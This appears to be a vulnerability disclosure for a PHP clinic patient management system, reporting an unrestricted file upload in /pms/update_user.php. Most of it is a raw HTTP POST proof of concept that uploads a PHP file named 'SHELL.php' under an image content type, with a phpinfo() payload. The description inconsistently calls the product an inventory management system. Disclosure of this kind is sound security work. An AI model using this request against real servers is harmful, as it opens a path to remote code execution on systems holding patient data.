## The clinic patient management system has File upload vulnerability
## supplier
https://www.sourcecodester.com/php-clinics-patient-management-system-source-code
## Vulnerability file
/pms/update_user.php
## describe
An unrestricted file upload attack exists in an inventory management system. An attacker can directly upload malicious script files to the target server.
## code analysis
There are no restrictions on uploading in update_user.php. You can directly upload script files to the target server.
<img width="979" alt="image" src="https://github.com/user-attachments/assets/2709da9b-11eb-4f2a-935b-8f9bbe506db7">


POC
```
POST /pms/update_user.php?user_id=1 HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------360883981378190962154985321
Content-Length: 823
Origin: http://localhost
Connection: close
Referer: http://localhost/pms/update_user.php?user_id=1
Cookie: PHPSESSID=cims89c5nt143re39d3ce6cdvd; __insuarance__logged=1; __insuarance__key=SK9MGL4R5CQPM34FZSH3
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

-----------------------------360883981378190962154985321
Content-Disposition: form-data; name="hidden_id"

1
-----------------------------360883981378190962154985321
Content-Disposition: form-data; name="display_name"

Administrator
-----------------------------360883981378190962154985321
Content-Disposition: form-data; name="username"

admin
-----------------------------360883981378190962154985321
Content-Disposition: form-data; name="password"


-----------------------------360883981378190962154985321
Content-Disposition: form-data; name="profile_picture"; filename="SHELL.php"
Content-Type: image/jpeg

<?php phpinfo();?>
-----------------------------360883981378190962154985321
Content-Disposition: form-data; name="save_user"


-----------------------------360883981378190962154985321--
```

<img width="1374" alt="image" src="https://github.com/user-attachments/assets/97ecb50d-d924-4d42-9ac5-e8e57780923c">
<img width="1165" alt="image" src="https://github.com/user-attachments/assets/1ea715a1-9d2b-404f-a5f1-4de7a6dbc650">



